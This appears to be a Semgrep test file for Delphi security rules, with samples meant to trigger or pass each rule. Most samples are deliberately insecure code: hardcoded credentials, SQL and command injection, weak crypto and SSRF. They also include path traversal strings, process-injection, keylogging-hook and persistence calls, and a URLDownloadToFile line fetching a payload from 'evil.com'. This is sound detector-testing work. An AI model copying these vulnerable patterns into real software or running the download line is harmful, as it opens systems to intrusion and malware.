// ==============================================
// SEMGREP DELPHI SECURITY RULES - TEST FILE
// Author: Hamit CİBO - https://www.linkedin.com/in/ciboh/
// License: MIT
// ==============================================
// This file is for testing all Delphi/Pascal security rules. 
// ruleid: → Expected positive (true positive)
// ok: → Expected negative (true negative)
// ================================================

// ==========================================
// PART 1: HARDCODED CREDENTIALS 
// ==========================================

// ruleid: delphi-hardcoded-credentials
const DB_PASSWORD = 'admin123';

// ok: delphi-hardcoded-credentials
const MAX_RETRIES = 5;

// ruleid: delphi-hardcoded-credentials
var api_secret: string = 'sk-abc123xyz789';

// ==========================================

// ruleid: delphi-direct-assignment-credentials
var password: string := 'secret123';

// ruleid: delphi-direct-assignment-credentials
user := 'admin';

// ruleid: delphi-direct-assignment-credentials
pass := 'pass123';

// ok: delphi-direct-assignment-credentials
counter := 10;

// ==========================================

// ruleid: delphi-parameter-credentials
Login('admin', 'password123');

// ruleid: delphi-parameter-credentials
Connect('user', 'pass');

// ok: delphi-parameter-credentials
Login(GetUsername, GetPassword);

// ==========================================

// ruleid: delphi-hardcoded-password
sifre := '123456';

// ruleid: delphi-hardcoded-password
parola := 'mySecret';

// ok: delphi-hardcoded-password
template_password := 'test_sample';

// ==========================================

// ruleid: delphi-hardcoded-username
kullanici := 'admin';

// ruleid: delphi-hardcoded-username
username := 'root';

// ok: delphi-hardcoded-username
guest_user := 'guest';

// ==========================================

// ruleid: delphi-hardcoded-api-key
api_key := 'sk-abc123xyz789def456';

// ruleid: delphi-hardcoded-api-key
client_secret := 'very_long_secret_key_16_chars';

// ==========================================

// ruleid: delphi-api-key-token
token := 'bearer_token_123';

// ruleid: delphi-api-key-token
access_token := 'abc12345';

// ==========================================

// ruleid: delphi-jwt-hardcoded
jwt_token := 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

// ok: delphi-jwt-hardcoded
not_jwt := 'just_a_normal_string';

// ==========================================
// PART 2: CONNECTION STRINGS & DATABASE
// ==========================================

// ruleid: delphi-connection-string-creds
connStr := 'Provider=SQLOLEDB;Password=admin123;User ID=sa';

// ruleid: delphi-connection-string-creds
TADOConnection1.ConnectionString := 'Password=secret;User ID=sa';

// ==========================================

// ruleid: delphi-connection-string-credentials
connStr2 := 'User ID=sa;Password=admin123';

// ruleid: delphi-connection-string-credentials
connStr3 := 'UID=user;PWD=pass';

// ==========================================

// ruleid: delphi-persist-security-info
connStr4 := 'Persist Security Info=True';

// ==========================================

// ruleid: delphi-oracle-credentials
TOraSession1.Username := 'scott';
TOraSession1.Password := 'tiger';

// ==========================================
// PART 3: MESSAGE QUEUE & WEB SERVICE
// ==========================================

// ruleid: delphi-message-queue-credentials
mq_password := 'mq_secret';

// ruleid: delphi-message-queue-credentials
rabbitmq.Password := 'rabbit_pass';

// ==========================================

// ruleid: delphi-webservice-credentials
wsUsername := 'soap_user';
wsPassword := 'soap_pass';

// ==========================================
// PART 4: NETWORK PROTOCOLS (FTP/SMTP)
// ==========================================

// ruleid: delphi-ftp-credentials
IdFTP1.Password := 'ftp123';
IdFTP1.Username := 'ftp_user';

// ==========================================

// ruleid: delphi-smtp-credentials
IdSMTP1.Username := 'mail@example.com';
IdSMTP1.Password := 'mail_pass';

// ==========================================
// PART 5: URL & HEADER EXPOSURE
// ==========================================

// ruleid: delphi-url-credential-exposure
url := 'http://api.example.com?token=abc123';
url2 := 'http://api.com?password=secret';

// ==========================================

// ruleid: delphi-hardcoded-auth-header
Authorization := 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9';

// ==========================================
// PART 6: CONFIG & ENCODED SECRETS
// ==========================================

// ruleid: delphi-config-secret
password = "admin123"

// ruleid: delphi-config-secret
secret = "mySecretKey"

// ok: delphi-config-secret
example = "test_value"

// ==========================================

// ruleid: delphi-base64-secret
encoded := 'cGFzc3dvcmQxMjM='; // Base64 of 'password123'

// ruleid: delphi-base64-secret
auth := 'dXNlcm5hbWU6cGFzc3dvcmQ='; // Base64 of 'username:password'

// ==========================================

// ruleid: delphi-base64-credential
secret := 'cGFzc3dvcmQxMjM0NTY=';

// ==========================================
// PART 7: CLOUD & CERTIFICATES
// ==========================================

// ruleid: delphi-cloud-access-key
aws_key := 'AKIAIOSFODNN7EXAMPLE';

// ruleid: delphi-cloud-access-key
github_token := 'ghp_abc123def456ghi789jkl';

// ==========================================

// ruleid: delphi-private-key-exposed
rsa_key := '-----BEGIN RSA PRIVATE KEY-----';

// ruleid: delphi-private-key-exposed
ec_key := '-----BEGIN EC PRIVATE KEY-----';

// ==========================================

// ruleid: delphi-private-key
priv_key := '-----BEGIN PRIVATE KEY-----';

// ==========================================

// ruleid: delphi-certificate-exposed
cert := '-----BEGIN CERTIFICATE-----';

// ==========================================
// PART 8: INJECTIONS
// ==========================================

procedure TestInjections;
var
  sql: string;
begin
  // ruleid: delphi-sql-injection-concat
  sql := 'SELECT * FROM users WHERE id = ' + Edit1.Text;
  
  // ruleid: delphi-sql-injection-concat
  sql := 'INSERT INTO users VALUES (' + EditName.Text + ', ' + EditPass.Text + ')';
  
  // ok: delphi-sql-injection-concat
  sql := 'SELECT * FROM users WHERE id = :id';
  
  // ==========================================
  
  // ruleid: delphi-sql-format-injection
  sql := Format('SELECT * FROM users WHERE id = %s', [Edit1.Text]);
  
  // ok: delphi-sql-format-injection
  sql := FormatDateTime('YYYY-MM-DD', Now);
  
  // ==========================================
  
  // ruleid: delphi-command-injection
  ShellExecute(0, 'open', 'cmd.exe', PChar('/c ' + Edit1.Text), '', SW_SHOW);
  
  // ruleid: delphi-command-injection
  WinExec(PChar('ping ' + EditIP.Text), SW_HIDE);
  
  // ok: delphi-command-injection
  ShellExecute(0, 'open', 'notepad.exe', 'test.txt', '', SW_SHOW);
end;

// ==========================================
// PART 9: WEAK CRYPTO
// ==========================================

// ruleid: delphi-weak-encryption-usage
var des := TDES.Create;
var rc4 := TRC4.Create;

// ruleid: delphi-weak-hash-usage
var md5 := THashMD5.Create;
var sha1 := TIdHashSHA1.Create;

// ok: delphi-weak-hash-usage
var sha256 := THashSHA2.Create;

// ==========================================
// PART 10: PROCESS & MALWARE
// ==========================================

// ruleid: delphi-process-injection
VirtualAllocEx(process, nil, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// ruleid: delphi-process-injection
CreateRemoteThread(process, nil, 0, addr, nil, 0, nil);

// ==========================================

// ruleid: delphi-keylogging
SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, GetModuleHandle(nil), 0);

// ==========================================

// ruleid: delphi-registry-persistence
Reg.WriteString('Software\Microsoft\Windows\CurrentVersion\Run', 'MyApp', '"C:\app.exe"');

// ==========================================
// PART 11: NETWORK & SSRF
// ==========================================

// ruleid: delphi-http-insecure-dynamic
IdHTTP1.Get('http://example.com/api');

// ruleid: delphi-http-insecure-dynamic
IdHTTP1.Post('http://' + EditHost.Text + '/api', data);

// ==========================================

// ruleid: delphi-http-no-tls
http_url := 'http://example.com';

// ok: delphi-http-no-tls
https_url := 'https://secure.example.com';

// ==========================================

// ruleid: delphi-ssrf-dynamic
IdHTTP1.Get('http://' + EditHost.Text + '/internal');

// ==========================================
// PART 12: INFO DISCLOSURE & DEBUG
// ==========================================

// ruleid: delphi-exception-info-leak
ShowMessage(Exception.Message);

// ruleid: delphi-exception-info-leak
MessageDlg(Exception.Message, mtError, [mbOK], 0);

// ==========================================

// ruleid: delphi-debug-leftover
OutputDebugString('Debug: variable value = ' + IntToStr(value));

// ruleid: delphi-debug-leftover
WriteLn('Debug output');

// ==========================================
// PART 13: FILE OPERATIONS & DANGEROUS APIS
// ==========================================

// ruleid: delphi-path-traversal
file_path := '../../etc/passwd';

// ruleid: delphi-path-traversal
path := '..\..\Windows\System32\config';

// ==========================================

// ruleid: delphi-dangerous-api
CreateOleObject('Scripting.FileSystemObject');

// ruleid: delphi-dangerous-api
URLDownloadToFile(nil, 'http://evil.com/payload.exe', 'C:\temp\payload.exe', 0, nil);

// ==========================================

// ruleid: delphi-delete-file
DeleteFile('C:\temp\file.txt');

// ruleid: delphi-delete-file
TFile.Delete('important_data.dat');

// ==========================================
// PART 14: DFM FILES
// ==========================================

// NOT: Bu testler .dfm dosyaları içindir
// ruleid: delphi-dfm-password
// Password = 'admin123'

// ruleid: delphi-dfm-connection
// ConnectionString = 'Provider=SQLOLEDB;Password=admin123'

// ==========================================
// END OF TEST FILE
// ==========================================
